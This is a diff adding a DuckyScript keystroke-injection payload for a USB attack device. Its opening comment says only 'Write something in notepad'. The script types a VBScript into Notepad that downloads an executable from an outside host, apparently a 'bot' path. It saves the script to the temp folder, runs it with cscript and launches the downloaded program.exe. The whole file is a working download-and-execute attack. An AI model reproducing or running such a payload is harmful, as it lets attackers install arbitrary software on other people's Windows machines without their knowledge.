@@ -1,0 +1,81 @@
+REM Write something in notepad
+
+DELAY 1000
+
+GUI r
+DELAY 500
+
+STRING notepad.exe
+ENTER
+
+DELAY 500
+
+STRING strFileURL = "http://test.helgesverre.com/bot/example.exe" 
+ENTER
+STRING Set objFSO = Createobject("Scripting.FileSystemObject")
+ENTER
+STRING strHDLocation = objFSO.GetSpecialFolder(2) & "\program.exe"
+ENTER
+STRING Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+ENTER
+STRING objXMLHTTP.open "GET", strFileURL, false
+ENTER
+STRING objXMLHTTP.send()
+ENTER
+STRING If objXMLHTTP.Status = 200 Then
+ENTER
+STRING Set objADOStream = CreateObject("ADODB.Stream")
+ENTER
+STRING objADOStream.Open
+ENTER
+STRING objADOStream.Type = 1
+ENTER
+STRING objADOStream.Write objXMLHTTP.ResponseBody
+ENTER
+STRING objADOStream.Position = 0 
+ENTER
+STRING End If 
+ENTER
+STRING If objFSO.Fileexists(strHDLocation) Then 
+ENTER
+STRING objFSO.DeleteFile strHDLocation
+ENTER
+STRING Set objFSO = Nothing
+ENTER
+STRING End If
+ENTER
+STRING objADOStream.SaveToFile strHDLocation
+ENTER
+STRING objADOStream.Close
+ENTER
+STRING Set objADOStream = Nothing
+ENTER
+STRING Set objXMLHTTP = Nothing
+
+
+CTRL s
+DELAY 100
+
+STRING %temp%\test.vbs
+ENTER
+
+DELAY 100 
+
+ALT F4
+
+DELAY 500
+
+GUI r
+DELAY 1000
+
+STRING cscript %temp%\test.vbs
+ENTER
+
+DELAY 5000
+
+
+GUI r
+DELAY 1000
+
+STRING %temp%\program.exe
+ENTER
